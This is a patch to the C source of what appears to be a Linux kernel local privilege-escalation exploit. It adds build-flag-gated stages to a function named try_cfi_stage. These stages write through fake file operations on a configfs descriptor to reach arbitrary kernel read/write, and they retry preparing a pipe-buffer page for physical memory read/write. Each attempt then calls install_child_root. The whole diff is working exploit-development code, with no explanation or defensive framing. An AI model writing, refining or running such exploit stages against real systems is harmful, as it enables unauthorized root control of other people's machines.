@@ -347,6 +347,24 @@ int try_cfi_stage(void) {
     goto fail;
   }
 
+#if defined(QEMU_STACK_WRITER_ONLY) && QEMU_STACK_WRITER_ONLY
+  uint64_t writer_null_owner = 0;
+  ssize_t writer_owner = configfs_write_once(
+      fd, fake_fops, &writer_null_owner, sizeof(writer_null_owner));
+  cfi_owner_ret = writer_owner;
+  if (writer_owner != (ssize_t)sizeof(writer_null_owner)) {
+    cfi_last_step = 7;
+    cfi_last_errno = errno;
+    goto fail;
+  }
+  SYSCHK(close(fd));
+  cfi_last_step = 0;
+  cfi_last_errno = 0;
+  atomic_store(&cfi_stage_done, 1);
+  pr_success("QEMU_STACK_WRITER_OK backend reached verified configfs ARW\n");
+  return 1;
+#endif
+
   pr_info("cfi starting pipe physrw\n");
 
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
@@ -357,12 +375,31 @@ int try_cfi_stage(void) {
   }
 #endif
 
+#if defined(APP_FOPS_BEFORE_PIPE) && APP_FOPS_BEFORE_PIPE
+  pipebuf_page_base = prepare_pipe_buffer_page();
+  pr_info("fresh physrw pipe after verified fops page=%016zx\n",
+          pipebuf_page_base);
+  if (!is_direct_ptr(pipebuf_page_base)) {
+    cfi_last_step = 8;
+    cfi_last_errno = errno;
+    goto fail;
+  }
+#endif
+
   int installed = 0;
   pipe_stage_attempts = 0;
   for (int attempt = 0; attempt < PIPE_MAX_ATTEMPTS; attempt++) {
     pipe_stage_attempts++;
     if (attempt != 0) {
       reset_pipe_attempt();
+#if defined(APP_FOPS_BEFORE_PIPE) && APP_FOPS_BEFORE_PIPE
+      pipebuf_page_base = prepare_pipe_buffer_page();
+      pr_info("fresh physrw retry page attempt=%d/%d base=%016zx\n",
+              attempt + 1, PIPE_MAX_ATTEMPTS, pipebuf_page_base);
+      if (!is_direct_ptr(pipebuf_page_base)) {
+        continue;
+      }
+#endif
     }
     if (install_child_root(fd)) {
       installed = 1;
